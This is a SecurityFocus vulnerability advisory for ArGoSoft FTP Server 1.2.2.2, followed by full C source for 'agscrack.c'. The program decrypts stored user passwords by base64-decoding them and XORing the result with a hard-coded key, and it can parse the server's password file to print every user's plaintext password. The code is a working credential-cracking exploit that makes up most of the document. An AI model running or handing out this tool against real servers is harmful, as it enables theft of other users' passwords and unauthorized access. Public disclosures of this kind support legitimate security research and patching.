source: http://www.securityfocus.com/bid/3029/info

ArGoSoft FTP server is an FTP server for the Windows platform.

A design error exists in ArGoSoft FTP which enables an authenticated user to view other users encrypted passwords. However due to a weak encryption scheme it is possible for a user to decrypt the password using a third party utility. 

/********************************************************************

 * agscrack.c - ArGoSoft FTP Server 1.2.2.2 password file cracker   *

 * by [ByteRage] <byterage@yahoo.com> [http://www.byterage.cjb.net] *

 ********************************************************************/



#include <string.h>

#include <stdio.h>



int len; FILE *fh;



/* DECRYPTION ALGORITHMS */

unsigned char char2bin(unsigned char inbyte) {

  if ((inbyte >= 'A') && (inbyte <= 'Z')) { len++; return(inbyte-'A');
}

  if ((inbyte >= 'a') && (inbyte <= 'z')) { len++;
return(inbyte-'a'+26); }

  if ((inbyte >= '0') && (inbyte <= '9')) { len++; return(inbyte+4); }

  if (inbyte == '+') { len++; return('\x3E'); }

  if (inbyte == '/') { len++; return('\x3F'); }

  return('\x00');

}

void decode(unsigned char chars[], unsigned char bytes[]) {

  int i,retval=0;

  for(i=0; i<4; i++) { retval <<= 6; retval |= char2bin(chars[i]); }

  for(i=0; i<3; i++) { bytes[2-i] = retval & 0xFF; retval >>= 8; }

  len--;

}

void decryptpass(unsigned char encrypted[], unsigned char decrypted[])
{

  const unsigned char heavycrypt0[] =
"T3ZlciB0aGUgaGlsbHMgYW5kIGZhciBhd2F5LCBUZWxldHViYmllcyBjb21lIHRvIHBsYXk
=";

  unsigned int j, k=0, l;

  len = 0;

  for(j=0; j<strlen(encrypted); j+=4) {

    decode(&encrypted[j], &decrypted[k]);

    for(l=0; l<3; l++) { decrypted[k] ^= heavycrypt0[k++]; }

  }

  decrypted[len] = '\x00';

}

/* DECRYPTION ALGORITHMS END */



void main(int argc, char ** argv) {

  char password[128]; /* ArGoSoft's passwords don't get larger than 128
bytes */

  char buf[256]; char b;

  int rd;



  printf("ArGoSoft FTP Server 1.2.2.2 password file cracker by
[ByteRage]\n\n");

  if (argc<2) { printf("Syntax : %s <password(file)>\n", argv[0]);
return 1; }

  

  fh = fopen(argv[1], "rb");

  if (!fh) {

    decryptpass(argv[1], &password);

    printf("%s -> %s\n", argv[1], password);

    return 0;

  } else {

    /* simple password file processor */

    fread(&buf,1,1,fh);

    if (buf[0] == 4) {

      while (1) {

        if (fread(&b,1,1,fh) == 0) { break; }

        if (fread(&buf,1,b+1,fh) == 0) { break; }

        printf("%s : ", buf);

        b=0; while(!b) if (fread(&b,1,1,fh) == 0) { break; }

        if (fread(&buf,1,b+1,fh) == 0) { break; }

        decryptpass(&buf, &password);

        printf("%s -> %s\n", &buf, password);

        b=0; while(!b) if (fread(&b,1,1,fh) == 0) { break; }

        if (fread(&buf,1,b+1,fh) == 0) { break; }

        b=0; while(b!=4) if (fread(&b,1,1,fh) == 0) { break; }

      }

    } else printf("error when processing passwordfile!");

    fclose(fh);  

  }

}